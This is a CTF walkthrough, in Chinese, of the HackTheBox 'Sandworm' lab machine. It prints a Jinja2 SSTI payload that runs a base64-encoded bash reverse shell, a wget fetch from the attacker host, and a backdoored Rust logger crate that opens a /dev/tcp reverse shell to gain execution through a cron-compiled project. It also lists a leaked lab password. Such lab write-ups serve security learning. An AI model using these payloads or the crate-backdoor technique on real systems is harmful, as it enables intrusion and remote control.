---
title: Sandworm - HackTheBox
url: https://darkwing.moe/2023/06/19/Sandworm-HackTheBox/
source: 喵喵喵喵
date: 2023-06-20
fetch_date: 2025-10-04T11:44:13.671483
---

# Sandworm - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Sandworm - HackTheBox

# Sandworm - HackTheBox

##### 2023-06-19

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80/443](#80-443)
3. [3. PGP](#PGP)
   1. [3.1. Vertify Signature](#Vertify-Signature)
   2. [3.2. SSTI](#SSTI)
   3. [3.3. reverse shell](#reverse-shell)
4. [4. 信息](#信息)
   1. [4.1. firejail](#firejail)
   2. [4.2. httpid](#httpid)
5. [5. user flag](#user-flag)
6. [6. 信息](#信息-1)
7. [7. tipnet](#tipnet)
   1. [7.1. logger](#logger)
   2. [7.2. shell](#shell)
   3. [7.3. lib.rs](#lib-rs)
8. [8. 提权信息](#提权信息)
9. [9. 提权 & root flag](#提权-amp-root-flag)
   1. [9.1. shadow](#shadow)
10. [10. 参考资料](#参考资料)

# Sandworm - HackTheBox

2023-06-19

# 基本信息

* <https://app.hackthebox.com/machines/Sandworm>
* 10.10.11.218

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061901.jpg)

# 端口扫描

22，80，443:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.218 Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-19 13:35 CST Nmap scan report for 10.10.11.218 Host is up (0.093s latency). Not shown: 995 closed tcp ports (conn-refused) PORT     STATE    SERVICE     VERSION 22/tcp   open     ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp   open     http        nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to https://ssa.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) 443/tcp  open     ssl/http    nginx 1.18.0 (Ubuntu) | ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA | Not valid before: 2023-05-04T18:03:25 |_Not valid after:  2050-09-19T18:03:25 |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Secret Spy Agency | Secret Security Service 1096/tcp filtered cnrprotocol 9207/tcp filtered wap-vcal-s Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 49.02 seconds ``` |

## 80/443

需要加hosts：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.218 ssa.htb ``` |

flask做的某安全公司官网：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061902.jpg)

# PGP

contact那里需要提交pgp加密的信息：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061903.jpg)

根据提示点进guide，里面是一些gpg功能，加解密，验证签名之类的:

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061904.jpg)

## Vertify Signature

后面操作生成一个新的密钥对吧，因为涉及到一些属性修改，避免影响主密钥的功能：

* GPG入门教程 - 阮一峰的网络日志
  <https://www.ruanyifeng.com/blog/2013/07/gpg.html>

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` gpg --quick-gen-key miao  gpg --armor --export miao > pubkey.asc echo 'miao' | gpg --clearsign ``` |

使用公钥和签名信息测试验证签名功能，发现输出信息中包含我们密钥设置的一些属性：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061905.jpg)

## SSTI

修改gpg密钥中的属性,根据前面知道是Flask，测试SSTI：

* Modify the GPG UID name - SoByte
  <https://www.sobyte.net/post/2021-12/modify-gpg-uid-name/>

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 ``` | ``` gpg --edit-key miao gpg> adduid Real name: {{7*7}} Email address: miao@miao.com Comment: You selected this USER-ID:     "{{7*7}} <miao@miao.com>" ``` |

就是根据文章一步步来，完成后重新进行前面的步骤，验证签名，发现SSTI执行成功：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061906.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061907.jpg)

## reverse shell

然后就是测试各种命令，最终得到atlas shell：

* PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings
  <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2>

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` /bin/bash -i >& /dev/tcp/10.10.14.16/4444 0>&1  L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE2LzQ0NDQgMD4mMQo=  {{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE2LzQ0NDQgMD4mMQo= | base64 -d | bash" ').read() }} ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061908.jpg)

# 信息

## firejail

简单的枚举发现是在firejail沙箱里：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061909.jpg)

## httpid

httpie里面一层层翻，admin.json里得到silentobserver密码：

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` silentobserver quietLiketheWind22 ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061910.jpg)

# user flag

silentobserver用户ssh登录：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061911.jpg)

# 信息

silentobserver上下文中运行pspy(因为atlas在沙盒里，wget，curl之类的都用不了)，发现root用户定时在atlas用户的上下文中运行和编译在 Rust 中开发的 tipnet 项目:

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061912.jpg)

# tipnet

源码和二进制程序我们都有权限查看，测试运行，发现我们的操作都会记录在日志里：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061913.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061914.jpg)

## logger

查看代码发现使用了一个外部库logger：

* Extern crates - The Rust Reference
  <https://doc.rust-lang.org/reference/items/extern-crates.html>

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061915.jpg)

而logger,当前用户有写权限:

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061916.jpg)

## shell

那就可以直接修改logger的代码来执行命令，参考这个,修改后不影响原本功能：

* rust-backdoors/reverse-shell/src/main.rs at master · LukeDSchenk/rust-backdoors · GitHub
  <https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs>

|  |  |
| --- | --- |
| ``` 1 ``` | ``` wget http://10.10.14.16:7777/lib.rs -O lib.rs ``` |

修改后等待tipnet执行，得到没有限制的atlas,写公钥方便后续操作：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061917.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023061918.jpg)

## lib.rs

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 ``` | ``` extern crate chrono;  use std::fs::OpenOptions; use std::io::Write; use chrono::prelude::*; use std::process::Command;  pub fn log(user: &str, query: &str, justification: &str) {     let command = "bash -i >& /dev/tcp/10.10.14.16/4444 0>&1";      let output = Command::new("bash")         .arg("-c")         .arg(command)         .output()         .expect("not work");      if output.status.success() {         let stdout = String::from_utf8_lossy(&output.stdout);         let stderr = String::from_utf8_lossy(&output.stderr);          println!("standar output: {}", stdout);         println!("error output: {}", stderr);     } else {         let stderr = String::from_utf8_lossy(&output.stderr);         eprintln!("Error: {}", stderr);     }      let now = Local::now();     let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();     let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);      let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {         Ok(file) => file,         Err(e) => {             println!("Error opening log file: {}", e);             return;         }     };      if let Err(e) = file.write_all(log_message.as_bytes()) {         println!("Error writing to log file: {}", e);     } } ``` |

# 提权信息

suid firejail,类似之前的Cerberus：

* Cerberus - HackTheBox | 喵喵喵喵...